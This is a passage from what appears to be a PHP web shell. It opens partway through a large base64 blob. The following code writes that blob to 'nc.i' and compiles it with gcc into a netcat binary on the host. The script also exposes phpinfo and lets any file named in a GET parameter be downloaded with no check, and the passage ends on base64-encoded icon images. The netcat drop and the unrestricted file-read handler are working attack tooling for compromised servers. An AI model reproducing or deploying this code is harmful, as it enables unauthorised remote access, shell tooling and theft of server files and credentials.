"k3hiBT3LXCcJLBbJluNMz7oha7ovhjYsxu6Tux7dwRPzzSpnCg7QywJ8V0lX3kTqpZ26M6Cyuq4m".
"Ui/t1P1dKot6lZ16SalOc+Vi7mvvBtJpxi+7+ZEE6TBA7m5LRG+Y5LdheRPSC7Y4QRla82iajPCN".
"YvZJeuYYtFAUFUN2JIx9vUVvmDi8vGYzl5fmqaKsTM+Bx5N0evEY5z6Lb30/zIt4amhibAbgRzJJ".
"RqA8XexCU3Z+fJtnaYwOX+gLoNHhvuDsHNHfnTdmU7fzud0USa94Fs8BELViokYEJduwWWN0M7ST".
"SjepiqZOWpKDhHRSR2UZz5xUDOzhK43prLw5JGFZXRx4KCVdp6x0YjbiKksjmdyWRRin1xf7b5zG".
"57ejsnBSi7iMi+t4bOBEA8uACcysocB/LZQJHB/B/sUujskat2KhCchbbnDRx3UtCLyTC34o9NbQ".
"APRB6E3KTMN53cOHU7rROy2vXAJOKGviy4opK/ZljSlrbGYxRhwnblrpSbvMPeU8aZe3njY8aSNP".
"WuSmVUWUk6uLVbRwGSJOcrfnI3Y52tdzbqBzOxVGFffX8DB2yR7cvTLYjk3aTf7DgQnqHrMP2nOw".
"GHDx2H9yL8l+Sxe4r8YFF+umvOYpgiP7pJFZiYOLPUsU3c3nV6GSRkyus8Q8GsUX+0J2GXwd3ooq".
"DnkUdVy0ObZX5ArpwQB/DoXXVUeHRc/6ueNsS9rOqIq4WsDXujtt8bxk1OH1bss+uGLwzC6uStZx".
"LKBZFIu8MgzJ3CVC5HW5Kd71jgGGo1jFmVtWNM9OKVla4bm7bBmSzBFW9jJEqziU46eQa7q32Fl4".
"cnx2/uz5r8rp8Sx8cXT27KffDjkrOWTtgqLrwBfNqm7YCpETyGh1WIaUJ/J9QyBMj9/ZewCn/vKu".
"/G7hs9q3CBu7nt8erBDq19nYWuA22Agf7giitlF9/wbzfOpsSlki/UNndBf9JywedIu51Ec+IdNg".
"+o+Y7rRm6BYqUpqjhPoK+RVbDpxEpgleuo6TGulJL2vSmULpyRBapa8Nrlp6spR+WZPJa7rkUqqm".
"D3uubn7QbXQ+quAaLYbTLSvnrxxy9kt4Qai6/OeQO3XY+KgF35tN6z5O+DnnEh8ygWAhiZULaDEy".
"RIpZL9iEbODKtyKXhAvWkSIz0DDADPE1tF1EsFIyVX3y0jZkI1XiO8Ssfwutf2gj6LKK2Y4ZiKu+".
"/rIEXH0xoISbnJWrBoxx/ehsfw4u57Xje2cNsA/yWWyh1nKIdYcDcjf472quTswJu/GyYWtN69Q6".
"ZzmCT3SnHuHJ4rspaD6DE9+Q56aqUFOQT7CNZbxeBILMv1h8kXME/TTcGVo95Nhw1PtB6seUhscq".
"TZnRoijQyR01zGqedLumOmyHFN12hUSr7uO9tlupk1FamZdS7TksSyx3TdsB3Hfc+BqraYsqRflX".
"9yfkIjkjw+PQSWWPswyFHxx7lWWGUrGQkk8kzuKUG7YCdYNsJi6QffD7H7YiTruYLq4Tdi0nvKMs".
"oPFb+43R3dph7ngtnEkDkPoGa3TamPFKurIPSZq7DZ2fQSL+sFZQNYoh3mbpyzGkoymsk9AtSpHM".
"Tg0xfU6XKVlqiosiS07V+ihvAlbqJmDID24gbarSJIJFK4YDi8vKStlKWfrl7K0MOCY+hnruKK1E".
"JrB5OeTRFZYitLZkS/8wgBjBx7Auc96UOaJMUIU7+f9YmLh6DNA+XZTxeLdOYxIF9jjlaOI5cRRd".
"LnYOpI0JpccKwnT9kWn2azQfi0fqEZrN4HXQ/E+p4JMfAnCGelvDg8uOl3N/1x70psajSu9LR0Q6".
"+AaKECB9543gOmxGsLRWdbSQM5T96EqKJ/Y+s65xemilZlTVu10YrI5da6gVi7auQ8dak2h8rd0E".
"mhhA4V/yZzWa4YoNK89qd1AzBjtdh17gNaPwF8tgxj3pG0eVxyowFYYnemALIdGvMpAReZblJNRp".
"zDFM98Vgj8z7LAWPQUvY0l0MdnVLepLSleggEfl8W8ezc5CvHtABs0cK0OliHti7RSaaUzyCY6ai".
"P+c5xioM/oS/hmtIqj/RZfWHYJt9QbcmY7zE3GffGX1BJgq0ZMSaWqRv0+wmvXgDWY/WXx//enzy".
"z+ONR2ahPKxGOSsCP5zMxZhnwo9HppaHXkJXTkwT0uB0GJsBFSoJDBLm0SGFhdx+hCz36DVDksaF".
"pfwCvxjhZln2dpEHkyiZLYrYLE+24SKg4Igs5zijcYvLMojKMhsluF0KbpLqiqBBIUZbMqpAXpmM".
"bxVFKSWvCryEOVyzRuYsSaezGI11WhaZGlK0E3PaGzk3RQaTJltUtXkwhu6YsazqtmJUh25C+S9h".
"khSj6zH8sAboKr5Nk8vyYrBNxbf7g53dvf3HB0+iyxHu14NHGn/iKolctEm/ij7UWOchEDe2N4Y1".
"xQY1xYDCb8ldALYIm8FsNMM7Cl2KFni+WFdUTc/NTTYmdkHOVFle4QTxZ14mU8iE5uyUFL3dmNcb".
"JNKpmvU9GLrTeZN+00+rPdN9cxP1xWlsF1qz2SkLQQxGHsbImPlbTnWnHvqEw/rtz0xxvazJu6FH".
"vfx5RZSOs3lNJsx7XP9qcmEKXuKLar6u0G0CfzWKvklZsGQe6K+CrRHdrrLZDG9rlfjUZ96H/wfw".
"/w78vwv/78H/+xtCoCLRi6H6wuKbVGGTqmxSpU2qBn/vD8n8mMDaK9Hf4Ar+JC8A9Qm2OwbBQjac".
"2vaFSz0Ur5OEAm5zqeDHYBd64zT+KC9iWDWBH7JFGfCaT1EG9Gplr7xphffsPDC5KK6r/kbWr0WW".
"Rg1LfDD739R78f7io+ARb+ADRzDwkv3Rf1JRcDKZLcorkcWudK19QDHO4rjC0vAx2UTncHRE6cSZ".
"1Ap7aJDWaUooZzFGgOzTR3yLF23wt+oKEG4EHd2gdv0UFcQ3mBfYp8/0Y0YMuYL01DrTU8sRtc9K".
"PgryRVp9/oijQVhU86qAFW0mECn5Jes+dG993Q4x0GcMF80ifI1me0Mgx5QVwFZH7FGZL4oEeZnW".
"lUCe9H3OBht3VH9i0M8/KWYzwjAIRG1Q6OMyHpEh1RA4pD1ZaVhQzXf8YlipeBbtnbO6F2iamOBj".
"DzhBRxMEIW5A4Vhznhar1S/s/Q28Avc+dnrK9uH/7STjuoN5wTcgUIKvgu3bCfsz0vkeSknocsDy".
"4HNj0WLjJt65y3vBNlCdsa6Yt3xQBapfjklPi1E6sZLifDoXo7hmrhCTBEhNb5OLGN3aZCW91+03".
"63YRT3EdLGSfhnoiFr0VHfscIbHeCHwUmwJAmD0H/ScDXwlUDqlJkEIovZByiBZk/AijH9xubQlG".
"QmCbOfLW1/9Jv1aCD0GQ0zzW3iJUhIC9/eaboQgkLtq9FdKR/s6xBJez8qwfiCSpSXrrKJvnURGj".
"3lRCK6CjgJTPN9SmRdOoAvxnaGahfgkqej7sIHeaFwVuiyTCaoGGsc2tH1EDR8S2fryiZ5E2kOFo".
"IlJfhVh99OL4LJjcjL8r4utgnpRzFIqw5pVY/MsSeKsG3NAYwD5fKMwhlXTzUGYaV/hJX+sMOkxN".
"9CjWmBLT/fs2LMgo6JKW/arbRhqsWzNktkLpMjuaX/X97z2Hko0iEZaxIkfCxW/DlFXZxC20saEm".
"I33r4kOn+2RxmxUgQDY4rSjSrD7efEPLVC+i3rclI+UPQIi4Yr/XOUPwRs1ySElOf5TxUkRONvS5".
"rA29huvzKP0a/SkLkPhf4iYTNvPB0Sux6wTm1FhRMMAPgrUu72hPu66VYTThJeWzAry1L8unKHdu".
"omJMRfTdcDx+GpjNleLFR2N+MMhikvSCATDJVjAQuhVKNbYF1osSbejy6e2b4KuvsMj3wcHGEEWW".
"Em3i9duvWIPcJHL7plcHqhdYDMKHQemsVh8URBrbtMoikSVb24CdvwCr19p+s2HIUkZppfBbgpfY".
"Uh6la2SxmhNsVEsVz6gznuQRkzcccnHNwUuZnhwqrmcrZgn+53803tn6MeByEHomZek/oyKFHe1T".
"gAf9BqZ12Yg6i5xGJpTAJLy1meCnd94Fh2Ol7QwMzUgwi975XvAV/WjjCy9XbJtckXByeVhhQ5tr".
"1rS2Rr87n3Qa6bbuscH1yQE1gjgy9YNnywBB8KVlQa2sUgCwWAsL6tMd59+avq5LXqwXaSYvmk0L".
"rXMJHiQ+XOuw1FmD+4GObw70xdT2gY4raQ9az0v+5k6Or9toejZLd5TYnDR+TVMgQyZpCvyXX5k1".
"Uu40hf7mKhld4epMlly1PeSGG8bCWiFIHxJ9WQ8YjS/Ifvj1f33tyepT1n+2vx4qBY86qy2YvLf2".
"fBFbJpSmOd/qCPzIWiUqTLMqC6Z5CHuChByY4c8dVLqqsrRUirGgFTEqflzeIbLB+l2Pd1Gbx7yw".
"Es4IEOTFVSnztn4sQwRgSNlb1DXvvIIUy27B5FjMpXLaw50PKqe48bntQUXPcqbTsxdojfMEKbb0".
"guYK5lLog65xiwHQx4QzZN2ARFWWqIqKbrd2JYPfNUUU+qtLV2tI7SY9Y8eFjJhB7SP4UCRlBGjh".
"BR9PfrA3ZNt0OrX7RH9UYE1WekrjUwr7lkImIjvGI8Y0G9akW6AtFthQ7ODN3bRejourve0mcZXG".
"txWbJXRMr2+y8dvaUhvCypQ8RhaL5olT6vE2/MGCMH4zGM873B6LMaMdMDMwr2+YPWJjTDigpgmq".
"eV+NtEoOBmJALos4eqvPiVtljbzb2hJbPo2H9Y01x3Z/b29nrw5bhdCdH6G7ZoQsLO5MLO4YFjrr".
"sDlMM2qWRWMcppKj0IMUWNUSd7ycDegs8yReJUOfH++t3Bh9Hkh+kJsOicTTIM1Y/n9x8xxf/WeZ".
"XPiTjbq6l9l0UQYUH7ak0ytidN4fYVtBBOUwzLLg+x9gKnB6a8Pf5xJLkPaDMpPlxfb2NPGct9Cf".
"cRbfYqyayRjRJIvTuNZ+BKnjRT7A0r1gWzfhcvsty93uBX3zk2nouLSW4v1XjlYv+Pq7r5WFje+k".
"mVFHWtFoTWblCQlEeaaByHuGWQ7rcnJT52AbKq1uvI6QCU8MmUBOzNkoS9MYdA6YkXikCMBn+GOm".
"24uEdWIzKFgsXIuBCt2CpArPvIVnuUVxstSSVdxRaujeFBM7PabhNJkw1tbS+KZ8Wz31KzypOCHH".
"s0e0YQ56wdnJ81/DFy9Pn/3eg237q9OT85Pw9YtXplmztuLZ+emhXvP8+Ss5uLzS95bBmxkMYLnj".
"wB7ZFZSJnBYb1iMxP4jxC7RtlLBgAoAML8ywmsCG9Kb2V7dqqbtVhpaCLB1b/FxA6jG81SJelDEN".
"G+cdLpcamurv3actWn1UW18E+zsHprEq4AfIsAgDS02ieTK7Y5IWMavLC/hZsr8WIgdcKU3ZzFyh".
"w9IsQ3wmNG1FCR6fxjoU6p1UVWdMgSFiSksawEahCXn6skiG4Vk+1MwOd+R+ENwxC/OdsjBziJcJ".
"BgIUAyNdz/n5OsgIhpjTEVFCKUBq6JADtZWs6UgPFd0nB3Z5se+UYw8rXHGXUDiEUTTDPR3Jf23D".
"bo/CBgkhAMiPyUiqNlsw1ar7QVtyi8I3A4vokmHB3EGQirjJlAjV4iOFCzt4N9fzVJzurWn8pXOk".
"wV9FG3/pNU2eKnKaNY/7O+asQdSEJ8uGDOTJbRjkH6HYR7pN5IJ40oNCWnB3DzZUJq5MrIhI24TE".
"b75BybTTd9LI7AH0gQ2CdK75BhWozdpOQ/6O0AkdeMIfRx6S0PzgKl+AxjfRjDLBiUEAGD2WDSqE".
"sjc1EB+7+80PdSUUu/EfRkOtAyvo2d7AJiN7X9rRlLBYhqrcV7VWoIsl7OhVL9jt8VEWGxGfVFdH".
"uMUIbxormJrNnnm/0t902AnLBnMCkdIT3WzkCe+GcRRLuEr1pEHAsVnSIuAM4yOB3uI0rZUp/f62".
"UN3Zaa9QA01B6Zv+6rRfpYhCW/KQn5/XjTPuw/M31sE8x1A3V9n7xPHFCtQukcsXZoGyMHjfrsxp".
"ileTmmorXM6gbPVlGaURaru7zwOxhEueBhUw4GOCD9SXwVYOLDB9VMNJYvikdmTOGqkDavsiXAR5".
"NeOM6wO99NB3hbrjmcTPor0cr032KZuY/KCpfhIFQk346rYWe7maM/x10EqVw4LipE652PWCR6y7".
"qAPAOF880lqpUcBEs3R0XJnQmhQHzfbdAOFRlN7p+Dr5b9CM9+2334pC75V9yNb15AEAo48O5v2G".
"ZpirY8P2sSQBNDDEZ6sA5RxQxKPrSZHN19T46wiir0Mv+P3sZfjq8PBXP28ICfvVrTifMLy1aKcC".
"Uiys5pmGLpeXwNC7A1u3f1jhzlEAiZSUSSUI3k5XD1W7LErRaBTn3dDms0kjl00sc2lxlw0pBFEQ".
"r/Euii2uPj8lYAo3YjCcc34ly6bc/cOj+SmXl91tuX+ZdtcdeNdtNKUQ0UAZm05mrLNvEfPF5B2u".
"N1bihqGUak5NuoevnoV5X6nMi/6AOd8r9yZ9gmzTwRjnM26bupUmQmXJzdF6O/h2cItncJvvaOvC".
"5Qpk5bRSvfvmmyE3+HDrldixSLIcvcLuwFpYPmXuLQoXLkrEuD2VY1yD9v4u4ym7vzssGFDb7LjX".
"+lE77Oi/ulWMrmuXD7F4jPJWMf9F8KRviRZNStu7JwN6zWJi79WYfJGqjuETpIMQJx1tao1moSYK".
"CWMEfuAWAqUOqTisydqdipJ/YpWU9iGCmyuw73GLXuTecrfG1jhJr6MZ+p0yuYyIg5i4+LJ8E+AC".
"gqZF+viStso4PgJLdsIivtSBPFv95NgLgf8gUN09N5eqT5vGgJR6LiWfdtHT8dLQY+MsZZzDtqti".
"duGbq7iIdWOyRwenMh6FuyiUke2mSKqYgZQ3FYQiyafS5z8EtkVNoDJJirLiMNhU+q/PA+q+8g2v".
"8Qxn+ggtf0wVYtYWbUXk2i7feVru/yKRe/bvaZqnprQTBXrBTn9n5zFJpm1Ng4HCPyodk49HIRQf".
"/dKA0b5whWybb13J+4Mkr2AAcydXyx1Ptp3LChktCtjvBI+DaTlMBZdQorY/4isXbcG4ZzL8vByJ".
"xEz9hFlv7M/s1TFvzM2asyNn69d61sd1i8nYECO897BFmMnbVhm7ZToZ62dHqbOFJqgZOzqJprEo".
"SCQTKsEm5X/9/decIS5HNMDcmd3ZofHiP3qKc8XgA7XJ+ImXDpjXg1fZ4ONFcFI24QHVi70n5BTx".
"xdcqaZ+5UCCwNak6XI50rR8Db9K0yxDc4wM1LQD+9+r0S5TAv7egVvAN5xABCMtvovHsGxBxysSE".
"Kz9D5vaNXryPnj4KglBrqLnNjNnbGBWavqQOI7QYBlzA5cYxwGzrB8ZM2sk3R2vwBtWmg28PSG2C".
"0dlQ4/SNrKV3pN/nPYlU2n7/Dd+YGD2hP3fCsI7+2D/izRqBMxtscWHu7o0iG2MGpzYaJrcnS9U3".
"GMrOZGZ1wApE4wa5EMLH90F/8BiX9U3s4KY0zrIdBCV+/a0EFyloGmBLuWSV/pPyWrdKImYoEomG".
"PeQt3efDY7fAO6WsIshbYbD4QJfN+4/ts0WMUiLlbu15qzIx2Uew73Nfampak6j6+1k8qdzk1EkW".
"3g8VHUd4sm5qM2iJ1dydgBI/wiwSbCaX5Ff6DS0oRCfebBXmK4jPJ32de7Gtr6/TDcSNrR/xIjQL".
"3b9xsY4UFMH72SGR0AexGHuJb2PjTfA/P9CtFZEU9IPvvw9Y7S/banOFQFBHnKexnsvVlGiNu9GU".
"/5C6LL/4KnfKoiRPZ11/r+3LEv74tmyhr7iPXa8V7GfcqRVzQU7wVuJtd6LdVz8E/5+PeNvdaYd/".
"uLogNBz9JErd5bR0LZnctn3Q1pH1+/LKV/dhFXZXQ4z1jeCYg8H2thpENrBKEpushH/IDgEz7Dqe".
"GfKKrt2i9OP3cdUxFrunLBhDnLqwa8k9fovZ2S3x+8tikPgpyIx00/5+j93yZYophzEwFdTv+W6/".
"+Rx0l3dVCgPehmHhtfRJUxiI08s1vXFpf2LqVv3Ad+Rz77h343I+7IidkBO00jDMRBInQ82dRM0h".
"IGZDA2pbM222Tdpo10w5LQZ/9STgltZobGwypIF1g9MIWUlZEx9K6tdJrmXEvpLXODl1DVpKerZM".
"wwpsmdZoQLiu90EfHQYSRt2Y5l1G75NxsjV228b+kI/c2kpj9+kWHX3FMQbuvTlw9tq7Jibp5zya".
"hZTUar3lVf9W/bXX2A+abGBM9nTNlBKcEj/S+sScFTlX86QNw1nlJ/JVBDJN4gKtsMJbkYHp8RmB".
"jdeoQ8ZV+M/58mi2UWVZMI/SuwCEX75AbbkqkrgkOWjqh/qFJd6y5FquX8OKl+Y6XppdRZfFFPKB".
"S2FhoxB1ucElJacEPuy8V1syQYUwEYXkvLcmvVivLJ2HsFbXfN/ngqrYujgjYRNSaPW2Aee9xHaJ".
"Xm7r9WgqaL187+0lrk61vdS6RacAPk2u0S6FsUaTdBHbIyzpp5iUceeNWm29WpM6YvQbrKRv8TzC".
"CI5RMR318FD7WmzNMAUrsI3WJuXhZm0tCHiIHxVnBfKGKp3F8YLujOn0B/7jXs21tiQGaWTfPJZX".
"b+syyJBYZa7TQV1ZsjDXlVYm2mxR8EujbSWrq3juL+pGZuEuW9u+3EXRkDvLGjKvkobMkQmXjxh6".
"2zNHcr9fdKAF6/EF6Km/0muew6o4PveBIpco/ThSaFGa5uHNpsUJMRAhfDytsqwNWX6wRHk97I8b".
"Fai+i7LQBjvlbDZam6Gn2q/Zq0gTsI2hsCGMe3niji8RHXhFqgFhpzb0hV6s31RMWElQphi3Jugs".
"EiXLxbaw4sGHcBYEsaNRsD9QbxWKfBmAg4FAJwJuICPILj/won29qBtd5vl8HOCK9DRoiDJj6EVC".
"XcTzKq0xzRCiuSJJAxqsLOlUNHFrLIXsuJOZUDQrnG0CUZZU3eZibYc1HfarUc4vTOugR/x2Al1O".
"4ATqsUgVCvhInhluUnl24a+petFefc1iA2HMHUnr5W0g79OQg+eQ6n/OAVBBM4oSgScbKzNf68ia".
"y6x+NEA1Acmt/gaL0rEtonQQXrcaw1BgDmnhVh7GVBSt8jQifOsjzDO37LiYPCXUYot+R/HT6dOX".
"T6+Sp7M0e5o/BRWzWlzfPH3/iO1K8GhJRsEobxKKAaTZszGMRvB19PXTNcFVwPNbz7aKeJQV4zI4".
"Pvo3cRgLKYYOB9w126gfY311W0au6b6yL7Gsuh/IygoFDFFjl99/kFfU+iN+Lq3JsVtNwbPOm69A".
"dOYZqU6kbM8XZRVcxvDvrEpyoCbM/12cToMDcTnO8DZnWE4RS93/GZX7Da05qXJvTbFJpmvLCiwQ".
"hBnuRkab84Si6xDmAteDzaBP6sE0t90HGBkN1wFCJldNX4iuIDOSUiQSiCM9RLhCIjRaEIOreJbP".
"4/UNGdZX1E2wrhFvzhhveVVP2nss3d4aVQkHTTzMlUVxjgf1GWueuQlqbKuXSVkZIlhNkQyLyKB7".
"Plchxuh8n1ADJefIcGXKuO8qBm5bDJksJwS+RQnmLklF2slQsJbZBcka7MqvaYdrqLhtvKVU3K9k".
"NRl1ghZjMfUttlgwhNSxuw+ja1aIG/tqCt2wQvxA3ydMeOb3NYTEzC0fO6nolXbEyvppqhuFVVjL".
"e9Tvb/1YXYOmiCsC64h/hN8zMmDEQ3caj+NJBGKvZRYLwqSjYOuKlkmc1TKUnlqNHshsU3OutITV".
"ho0u42oZbI2HmSTzPe5QhX1e265I6uMt3X3hTMsvUPLrjUK3NE9ejAiXlDCRJ0gShLAWcBCsCAuI".
"zU9Ft/vB/8Bf29v8Hzwk2N/f1RSdbOLV9UZ00YhgEbcSPF6tXj4p7Xd723AdVhr19QXbbL8RgRzE".
"ntgQAXpB0z+NeVSwSrBy859CFjCg2jb3K6sA19zpMIaXYnVYY0yNe6CoYfKWlRhic3vrIYlSk2RR".
"Q3ibZBG8wjVWUYXfgDOFj5LfRoO6AUfdVxBXAgSFegKfnhDEPbG8CJdq8oghAD9qYdBMTl8LxBVm".
"7aIZ/rnlexJuJ1PebJJJrYMYYYjsEhsS/7D4lDIcne7+LWRRpjkOPpK8K4ygJq+oOuO4BEJGqpI9".
"pD7FTKuPJLwo36BPoXIv9EJC1xg+Z2T0ZmIjZYzhQyJ5kCvzPg6TZhjTWOPbHEl2+3rL2iBJbrV3".
"WPqGSGvLYGXcMZoMLMq18O8oN7hWdqDDRKHrGpmp7bjrdONU0RD9kbet6GAOjDmPWSWTqbUFRYuW".
"IBeQHm+gxysjCgqgCoMhK0hyfnD5XFVkQKUCLQMWUDYsBbykFez3cznjacMkkadiigf9sTGou7zM".
"9ypApUj65gdKM7GvFYJGxBaBrKjruXTVKMVkda2vSo4JvY7iO0O3zUv5oi3pU8sdzKWwGHqBIsGE".
"H7UWGUv4EQfrX5YbtPKyGGZyARMOxfxTeRTLblnBYYb87E/J38AjgcVuCPtIRRqlsTJBcFdsDoH7".
"vJDh35TW7DCg3u+g3+9bsbUsWjziTznchxAWY9nBjNWU1PaEfgcXZ/Z2nZNsLvKypoebrnt8aLev".
"1rgmLLMo2l5K+gLJfqtoLmLL3RxA+tHFdf/b/vab/6San3yZzWMap6efgbJ/scXvhrwhKwPdnRAL".
"4AUR6w1eWQv+k4rLhRkev1xmi3RMALZmeJeRCKzBuhDAOBRAQdxBeaSfEkhMP9uCdots+tlnn+E/".
"RTRHXGleRBM64OE9uBhH6ZSc4T7//M0jbkLWwEzJonET3X32WQmSZBRvQdkKLwlKoxD0rRcscmzg".
"4D/pZ1svMbrqZ055bkB6ileQDnpBf0DPxGCFKyhcXSVlMCoWkwpTEgoDDcnjeBbdKUsFUgutsSU9".
"ssAmAfwGTR5UdKw4gzqcsijDejp9RZ9LLJhCQR5bcCtLZ3daUFB8+Rr0lhfHZ1gwC3D/AaWv4ttg".
"vJjnaOyqimgySUaYzwYLm1VGBAB8GReYW0AGm0QY5JkVgU88iAFeZfhjuZIal1AY6WSU0g3+SM4T".
"8yqNNkwLqIqXYrHTCO8avgUXXyzgr+omAYAwRGi2y4o44LlvsPSNIDd39iGqCWoRvpMEzxTwTAfF".
"JqH8HsqjQN06+u6E2qWGWEhAGhEY9DeCO6UGotEHxjtKER8QDMl1Ml5AC1C3QIYsnwKxtq6S4ILe".
"jimT6/gNC3r+/wP+9T3YydgBAA=="));

              file_put_contents('nc.i', $netcat);
              system('gcc nc.i -o nc');
    //          unlink('nc.i');
              
          }

     }
     echo "</body>\n";
     echo "</html>\n";
    }    
    
    if(isset($_GET['content']) && $_GET['content'] == 'phpinfo') {
        phpinfo();
    }
    
    if(isset($_GET['content']) && $_GET['content'] == 'download') {
      $file = $_GET['filename'];
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename='.$file);
      header('Content-Lenght: '.filesize($file));
      readfile($file);
    }
    
    if(isset($_GET['content']) && $_GET['content'] == 'img') {
        if(isset($_GET['id'])) {
          header('Content-Type: image/png; charset=utf-8');
          $image = array(
            "edit" =>
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAK".
            "T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU".
            "kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX".
            "Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB".
            "eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt".
            "AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3".
            "AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX".
            "Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+".
            "5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk".
            "5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd".
            "0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA".
            "4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA".
            "BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph".
            "CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5".
            "h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+".
            "Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM".
            "WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ".
            "AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io".
            "UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp".
            "r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ".
            "D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb".
            "U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY".
            "/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir".
            "SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u".
            "p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh".
            "lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1".
            "mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO".
            "k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry".
            "FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I".
            "veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B".
            "Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/".
            "0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p".
            "DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q".
            "PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs".
            "OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5".
            "hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ".
            "rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9".
            "rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d".
            "T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX".
            "Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7".
            "vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S".
            "PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa".
            "RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO".
            "32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21".
            "e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV".
            "P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i".
